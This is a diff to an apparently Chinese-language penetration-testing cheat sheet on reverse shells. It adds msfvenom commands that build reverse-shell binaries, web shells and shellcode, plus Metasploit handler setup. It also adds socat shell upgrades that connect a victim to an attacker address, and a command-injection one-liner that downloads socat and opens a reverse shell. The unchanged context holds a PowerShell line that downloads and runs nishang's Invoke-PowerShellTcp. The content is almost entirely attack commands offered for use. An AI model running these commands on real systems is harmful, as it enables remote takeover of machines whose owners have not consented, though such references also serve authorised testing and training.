@@ -87,6 +87,7 @@ socat正向shell
 	注：需区分服务器的sh类型，可使用which sh查询。
 	不同的sh，影响不同的反向shell是否可以成功。
 
+- `php-reverse-shell <http://pentestmonkey.net/tools/web-shells/php-reverse-shell>`_
 - bash反向shell
 
 ::
@@ -164,16 +165,59 @@ socat正向shell
 	apt-get install powshell
 	powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.174.130 -port 4444
 
+- msfvenom生成
+
+::
+
+	列举payload：msfvenom -l
+	Binaries
+		Linux：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+		Windows：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+		Mac：msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+	Web Payloads
+		php：msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+			cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+		asp：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+		jsp：msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+		WAR：msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+	Scripting Payloads
+		Python：msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+		Bash：msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+		Perl：msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+	Shellcode
+		Linux Based Shellcode：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+		Windows Based Shellcode ：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+		Mac Based Shellcode：msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+	Handlers
+		use exploit/multi/handler
+		set PAYLOAD <Payload name>
+		set LHOST <LHOST value>
+		set LPORT <LPORT value>
+		set ExitOnSession false
+		exploit -j -z
+	
 shell升级为交互式shell
 -----------------------------------------
 
 - 半交互式shell
+	+ Python pty模块
+		::
 
-::
-
-	通常我们nc获得的shell都是不完全shell，需要通过Python的pty转换为半交互式shell。 
-	python -c "import pty;pty.spawn('/bin/bash')"
-	可以运行su命令。
+			通常我们nc获得的shell都是不完全shell，需要通过Python的pty转换为半交互式shell。 
+			python -c "import pty;pty.spawn('/bin/bash')"
+			可以运行su命令。
+		
+	+ socat
+		::
+		
+			在kali（监听）：socat file:`tty`,raw,echo=0 tcp-listen:4444
+			受害人：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+			如果没有安装socat。有独立的二进制文件可以从这个Github下载：
+			https://github.com/andrew-d/static-binaries
+			通过命令注入，可以将socat二进制文件下载到可写的目录，之后chmod，然后在一行中执行反向shell：
+			wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; 
+			chmod +x /tmp/socat; 
+			/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 - 完全交互式Shell
 
